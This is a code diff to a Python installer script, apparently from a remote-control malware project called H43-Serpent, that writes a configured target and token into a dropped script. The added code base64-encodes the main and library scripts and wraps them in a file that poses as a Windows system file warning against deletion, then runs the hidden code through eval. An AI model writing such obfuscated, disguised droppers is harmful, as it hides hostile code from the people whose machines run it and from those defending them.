@@ -7,8 +7,8 @@ REPO: https://github.com/Fytex/H43-Serpent
 import os
 import sys
 import pip
+import base64
 import ctypes
-import shutil
 import importlib
 import configparser
 
@@ -59,18 +59,45 @@ TARGET = config['CONFIGS']['TARGET']
 TOKEN = config['CONFIGS']['TOKEN']
 
 
-replacement_line = f'TARGET = \'{TARGET}\'\nTOKEN = \'{TOKEN}\'\nLIB = \'{LIB}\'\n'
+file_base64_content = '''\'\'\'
+WINDOWS SYSTEM
+
+[Warning]
+Deleting this system\'s file can make your computer malfunction.
+Action is irreversible.
+\'\'\'
+
+
+import base64
+eval(compile(base64.b64decode({}),\'<string>\',\'exec\'))
+'''
 
 
 with open(SCRIPTS_FOLDER + MAIN_SCRIPT_NAME) as from_file:
-    for _ in range(3):
-       from_file.readline()
-       
-    with open(d + MAIN_SCRIPT_NAME, 'w') as to_file:
-        to_file.write(replacement_line)
-        shutil.copyfileobj(from_file, to_file)
+    TARGET_VAR = from_file.readline().split('=')[0]
+    TOKEN_VAR = from_file.readline().split('=')[0]
+    LIB_VAR = from_file.readline().split('=')[0]
+
+    
+    replacement_line = f'{TARGET_VAR}= \'{TARGET}\'\n{TOKEN_VAR}= \'{TOKEN}\'\n{LIB_VAR}= \'{LIB}\'\n'
+    text = replacement_line + from_file.read()
+    encoded = base64.b64encode(text.encode())
+
+    
+with open(d + MAIN_SCRIPT_NAME, 'w') as to_file:  
+    to_file.write(file_base64_content.format(encoded))
+
+
+
+
+with open(SCRIPTS_FOLDER + LIB_SCRIPT_NAME) as from_file:
+    text = from_file.read()
+    encoded = base64.b64encode(text.encode())
         
-shutil.copyfile(SCRIPTS_FOLDER + LIB_SCRIPT_NAME, d + LIB_SCRIPT_NAME)
+with open(d + LIB_SCRIPT_NAME, 'w') as to_file:  
+    to_file.write(file_base64_content.format(encoded))
+
+
 
 os.chdir(d)
 sys.path.insert(0, d)
